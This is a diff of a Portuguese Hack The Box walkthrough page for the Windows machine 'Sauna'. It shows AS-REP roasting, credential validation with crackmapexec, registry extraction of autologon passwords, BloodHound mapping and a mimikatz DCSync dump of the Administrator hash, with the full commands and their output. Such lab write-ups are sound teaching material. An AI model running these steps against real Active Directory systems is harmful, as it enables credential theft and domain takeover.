@@ -160,7 +160,28 @@
 
                 <div id="content" class="content">
                     <main>
-                        <p><img src="Assets/HTB-Windows-Easy-Sauna/icon.webp" alt="" /></p>
+                        <ol>
+<li><a href="#resolu%C3%A7%C3%A3o-da-m%C3%A1quina-sauna">Resolução da máquina <strong>Sauna</strong></a> 1. <a href="#m%C3%A1quina-easy-hacktheboxcom">Máquina Easy (hackthebox.com)</a> 2. <a href="#by-javalimz---15092021">by <strong><em>JavaliMZ</em></strong> - 15/09/2021</a></li>
+<li><a href="#enumera%C3%A7%C3%A3o">Enumeração</a>
+<ol>
+<li><a href="#nmap">Nmap</a></li>
+</ol>
+</li>
+<li><a href="#web-server">Web Server</a></li>
+<li><a href="#as-rep-roasting-attack">AS-REP Roasting Attack</a>
+<ol>
+<li><a href="#getnpuserspy">GetNPUsers.py</a>
+<ol>
+<li><a href="#pwn3d"><strong><em>Pwn3d!</em></strong></a></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><a href="#primeiro-p%C3%A9-na-m%C3%A1quina">Primeiro pé na máquina</a></li>
+<li><a href="#bloodhound">BloodHound</a></li>
+<li><a href="#escalada-de-privil%C3%A9gios">Escalada de Privilégios</a></li>
+</ol>
+<p><img src="Assets/HTB-Windows-Easy-Sauna/icon.webp" alt="" /></p>
 <img src="https://img.shields.io/badge/Sauna-HackTheBox-green?style=plastic" width="200">
 <h1 id="resolução-da-máquina-sauna"><a class="header" href="#resolução-da-máquina-sauna">Resolução da máquina <strong>Sauna</strong></a></h1>
 <h4 id="máquina-easy-hacktheboxcom"><a class="header" href="#máquina-easy-hacktheboxcom">Máquina Easy (hackthebox.com)</a></h4>
@@ -181,7 +202,7 @@ Scanned at 2021-09-15 21:03:02 WEST for 96s
 PORT      STATE SERVICE       REASON  VERSION
 53/tcp    open  domain        syn-ack Simple DNS Plus
 80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
-| http-methods: 
+| http-methods:
 |   Supported Methods: OPTIONS TRACE GET HEAD POST
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
@@ -210,17 +231,17 @@ Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_clock-skew: 7h00m01s
-| p2p-conficker: 
+| p2p-conficker:
 |   Checking for Conficker.C or higher...
 |   Check 1 (port 35558/tcp): CLEAN (Timeout)
 |   Check 2 (port 54801/tcp): CLEAN (Timeout)
 |   Check 3 (port 18966/udp): CLEAN (Timeout)
 |   Check 4 (port 57297/udp): CLEAN (Timeout)
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
-| smb2-security-mode: 
-|   2.02: 
+| smb2-security-mode:
+|   2.02:
 |_    Message signing enabled and required
-| smb2-time: 
+| smb2-time:
 |   date: 2021-09-16T03:04:00
 |_  start_date: N/A
 
@@ -244,7 +265,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 #&gt;  Bowie Taylor
 #&gt;  Sophie Driver
 
-                                                                                                                                  
+
 cat users-full-name | tr '[A-Z]' '[a-z]'
 #&gt;  fergus smith
 #&gt;  hugo bear
@@ -252,7 +273,7 @@ cat users-full-name | tr '[A-Z]' '[a-z]'
 #&gt;  shaun coins
 #&gt;  bowie taylor
 #&gt;  sophie driver
-                                                                                                                                  
+
 cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) $2}'
 #&gt;  fsmith
 #&gt;  hbear
@@ -260,7 +281,7 @@ cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) $2}'
 #&gt;  scoins
 #&gt;  btaylor
 #&gt;  sdriver
-                                                                                                                                  
+
 cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) &quot;.&quot; $2}'
 #&gt;  f.smith
 #&gt;  h.bear
@@ -268,16 +289,16 @@ cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) &quot;.&q
 #&gt;  s.coins
 #&gt;  b.taylor
 #&gt;  s.driver
-                                                                                                                                  
+
 cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) $2}' &gt; users
-                                                                                                                                  
+
 cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) &quot;.&quot; $2}' &gt;&gt; users
 </code></pre>
 <p>Temos agora uma lista de usuários potenciais para efectuar a próxima tentativa de attack. AS-REP Roasting Attack!.</p>
 <h1 id="as-rep-roasting-attack"><a class="header" href="#as-rep-roasting-attack">AS-REP Roasting Attack</a></h1>
 <p>Uma das tecnologias de autenticação da Microsoft Active Directory é o Kerberos. Um artigo excelente sobre o que é o Kerberos e sobre o attack AS-REP Roasting Attack pode encontrar-se em https://thehackernews.com/2021/09/what-is-as-rep-roasting-attack-really.html</p>
 <p>Uma das primeiras etapas de autenticação Kerberos é a pré-autenticação. A pré-autenticação usa a senha do usuário para encriptar um carimbo de data / hora. O controlador de domínio (DC) irá decriptar isso para validar a senha correta e não ter uma solicitação anterior repetida. Uma vulnerabilidade pode ocorrer quando a pré-autenticação é desabilitada.</p>
-<p>Uma vez desativado,  quando um atacante solicita dados de autenticação de qualquer usuários, o DC retornará um &quot;Ticket&quot; de concessão de &quot;Ticket&quot; criptografado (TGT). Ele pode então ser crackeado por força bruta em um ambiente offline.</p>
+<p>Uma vez desativado, quando um atacante solicita dados de autenticação de qualquer usuários, o DC retornará um &quot;Ticket&quot; de concessão de &quot;Ticket&quot; criptografado (TGT). Ele pode então ser crackeado por força bruta em um ambiente offline.</p>
 <p>Para isso existem diversas ferramentas. Para esta máquina irei utilizar uma que, com ajuda da nossa lista de potenciais usuários, irá solicitar um TGT de cada usuário, e se o usuário existir e tiver a opção &quot;Do not require Kerberos preauthentication&quot;, iremos receber diretamente um TGT.</p>
 <h2 id="getnpuserspy"><a class="header" href="#getnpuserspy">GetNPUsers.py</a></h2>
 <p>Ainda antes do attack AS-REP Roasting Attack, poderíamos tentar ver recursos SMB e RPC, que são mais rápidos. Mas adiento já que não se vai ver nada para ambos. No entanto, para futuros ataques, precisamos saber mais informações sobre a máquina... Durante a tentativa de conexão por SMB, é possível recolher informações sobre o nome do domínio, e assim informar o nosso /etc/hosts para que haja menos problemas nos ataques futuros.</p>
@@ -317,21 +338,20 @@ crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 #&gt;  WINRM       10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
 #&gt;  WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
 </code></pre>
-<h3 id="pwn3d"><a class="header" href="#pwn3d"><em><strong>Pwn3d!</strong></em></a></h3>
-<p>O Crackmapexec nos diz que as credenciais estão válidas para ambos os serviços, mas no winrm informa-nos que está <em><strong>Pwn3d!</strong></em>. Isto significa que podemos entrar a vontade sem ser barrado por nenhum segurança xD</p>
+<h3 id="pwn3d"><a class="header" href="#pwn3d"><strong><em>Pwn3d!</em></strong></a></h3>
+<p>O Crackmapexec nos diz que as credenciais estão válidas para ambos os serviços, mas no winrm informa-nos que está <strong><em>Pwn3d!</em></strong>. Isto significa que podemos entrar a vontade sem ser barrado por nenhum segurança xD</p>
 <p><img src="Assets/HTB-Windows-Easy-Sauna/InTheMachine-user-fsmith.png" alt="In the machine with user fsmith" /></p>
 <h1 id="primeiro-pé-na-máquina"><a class="header" href="#primeiro-pé-na-máquina">Primeiro pé na máquina</a></h1>
 <p>Sabemos que é um Active Directory / Domain Controller. A primeira coisa a fazer num AD/DC é enumerar todos os usuários. Existem 2 tipos de usuários. Usuários Locais, e usuários de domínio. Para enumerar os usuários locais, podemos efectuar um &quot;net users&quot;:</p>
 <pre><code class="language-bash">net users
-#&gt;  
+#&gt;
 #&gt;  User accounts for \\
-#&gt;  
+#&gt;
 #&gt;  -------------------------------------------------------------------------------
 #&gt;  Administrator            FSmith                   Guest
 #&gt;  HSmith                   krbtgt                   svc_loanmgr
 </code></pre>
-<p>Adicionemos esse usuários à nossa lista...
-Não me foi possível enumerar os usuários de domínio através de &quot;Get-DomainUser&quot;, nem com &quot;wmic useraccount get name,sid&quot;...</p>
+<p>Adicionemos esse usuários à nossa lista... Não me foi possível enumerar os usuários de domínio através de &quot;Get-DomainUser&quot;, nem com &quot;wmic useraccount get name,sid&quot;...</p>
 <p>O segundo passo é ver se existem passwords por defeito. Esta máquina é uma simulação de uma empresa (Muito pequena certo, mas em grande escala as coisas funcionam exatamente da mesma maneira...), Portanto, existe sempre a possibilidade de os administradores decidirem adicionar uma palavra pass por defeito, para que a posterior, depois de criar um novo usuário, esse usuário altere a password para uma da sua escolha. O problema é que, se não for definido no windows para ser obrigatória a mudança de password no próximo login, os usuário podem ser preguiçoso e não alteram esta password por defeito. Até mesmo os administradores... como iremos ver neste caso...</p>
 <p>Poderíamos utilizar o winPEAS64.exe para obter esta informação, mas com uma única linha de commando, podemos abrir o REG do &quot;autologon&quot; e descobrir a tal password por defeito...</p>
 <pre><code class="language-bash">cmd /c 'reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON&quot;'
@@ -362,10 +382,9 @@ Não me foi possível enumerar os usuários de domínio através de &quot;Get-Do
 #&gt; SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\krbtgt:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
 #&gt; SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!
 </code></pre>
-<p>BINGO! Encontrámos mais uma credential válida =&gt; <strong>svc_loanmgr:Moneymakestheworldgoround!</strong>
-Não esquecer de validar a credencial, em SMB e WINRM pelo crakmapexec também...</p>
+<p>BINGO! Encontrámos mais uma credential válida =&gt; <strong>svc_loanmgr:Moneymakestheworldgoround!</strong> Não esquecer de validar a credencial, em SMB e WINRM pelo crakmapexec também...</p>
 <p><img src="Assets/HTB-Windows-Easy-Sauna/InTheMachine-user-svc_loanmgr.png" alt="Validação de credenciais para user svc_loanmgr" /></p>
-<p>Mesma história... Este novo usuário tem privilégios para aceder à máquina via WinRM provavelmente por ser membro de um groupo chamado <em><strong>&quot;BUILTIN\Remote Management Users&quot;</strong></em></p>
+<p>Mesma história... Este novo usuário tem privilégios para aceder à máquina via WinRM provavelmente por ser membro de um groupo chamado <strong><em>&quot;BUILTIN\Remote Management Users&quot;</em></strong></p>
 <h1 id="bloodhound"><a class="header" href="#bloodhound">BloodHound</a></h1>
 <p>Já dentro da máquina, Mesmo tendo um shell verdadeiro e tal, nunca é fácil ver tudo rapidamente, nem é fácil saber por que caminho ir... Para além da mencionada ferramenta winPEAS64.exe, disponível no github, hà uma ferramenta espetacular para visualizar em modo gráfico todos os ramos entre usuários e groupos de todo um domain controller! Esta ferramenta é a <strong>BloodHound</strong>. O programa precisa de uma base de dados, o neo4j, que é uma base de dados graph.</p>
 <pre><code class="language-bash">sudo neo4j start
@@ -373,7 +392,7 @@ Não esquecer de validar a credencial, em SMB e WINRM pelo crakmapexec também..
 bloodhound &amp;&gt;/dev/null &amp;
 </code></pre>
 <p>Agora que dados por nessa base de dados?!</p>
-<p>Existem também diversas ferramentas lol (como quase tudo em PenTesting), mas acho que a mais cómoda e de forma totalmente remota desde o meu Kali-Linux é com a ferramenta <em><strong>&quot;bloodhound-python&quot;</strong></em></p>
+<p>Existem também diversas ferramentas lol (como quase tudo em PenTesting), mas acho que a mais cómoda e de forma totalmente remota desde o meu Kali-Linux é com a ferramenta <strong><em>&quot;bloodhound-python&quot;</em></strong></p>
 <pre><code class="language-bash">bloodhound-python -c All -u fsmith -p 'Thestrokes23' -d egotistical-bank.local -ns 10.10.10.175 -dc egotistical-bank.local
 </code></pre>
 <p><img src="Assets/HTB-Windows-Easy-Sauna/BloodHound.png" alt="BloodHound-python" /></p>
@@ -381,7 +400,7 @@ bloodhound &amp;&gt;/dev/null &amp;
 <p><img src="Assets/HTB-Windows-Easy-Sauna/Bloodhound_import.png" alt="BloodHound Import" /></p>
 <p><img src="Assets/HTB-Windows-Easy-Sauna/Videograma.webp" alt="BloodHound Video" /></p>
 <p>Este videograma é um mini exemplo do que se pode fazer com BloodHound. Isto representa todo o AD/DC e permite filtrar e encontrar caminhos mais facilmente...</p>
-<p>O parte final do video indica um caminho potencial, e indica também o que fazer para comprometer o domain controller! Com a credential que temos do user svc_loanmgr, temos possibilidade de nos converter no usuário de domínio que queremos. BloodHound também nos indica a ferramenta a utilizar para isso! <em><strong>MIMIKATZ</strong></em> e até o comando adequado <em><strong>lsadump::dcsync /domain:testlab.local /user:Administrator</strong></em></p>
+<p>O parte final do video indica um caminho potencial, e indica também o que fazer para comprometer o domain controller! Com a credential que temos do user svc<em>loanmgr, temos possibilidade de nos converter no usuário de domínio que queremos. BloodHound também nos indica a ferramenta a utilizar para isso! **_MIMIKATZ</em>** e até o comando adequado **<em>lsadump::dcsync /domain:testlab.local /user:Administrator</em>**</p>
 <p>Essa vulnerabilidade existe porque o usuário svc_loanmgr tem privilégios de DS-Replication-Get-Changes-All e de DS-Replication-Get-Changes no Domínio. Esse dois privilégios em conjunto permite executar o que é chamado de DCSync attack. É parecido ao que acontece quando se tem privilégios locais de SeImpersonatePrivileges, mas em Domain Controller.</p>
 <h1 id="escalada-de-privilégios"><a class="header" href="#escalada-de-privilégios">Escalada de Privilégios</a></h1>
 <pre><code class="language-bash"># Atenção ao link... só posso garantir estar válido AGORA MESMO enquanto escrevo...
@@ -393,7 +412,7 @@ upload mimikatz.exe
 
 #&gt;  ...
 #&gt;  ** SAM ACCOUNT **
-#&gt;  
+#&gt;
 #&gt;  SAM Username         : Administrator
 #&gt;  Account Type         : 30000000 ( USER_OBJECT )
 #&gt;  User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
@@ -401,7 +420,7 @@ upload mimikatz.exe
 #&gt;  Password last change : 7/26/2021 9:16:16 AM
 #&gt;  Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
 #&gt;  Object Relative ID   : 500
-#&gt;  
+#&gt;
 #&gt;  Credentials:
 #&gt;    Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
 #&gt;      ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e
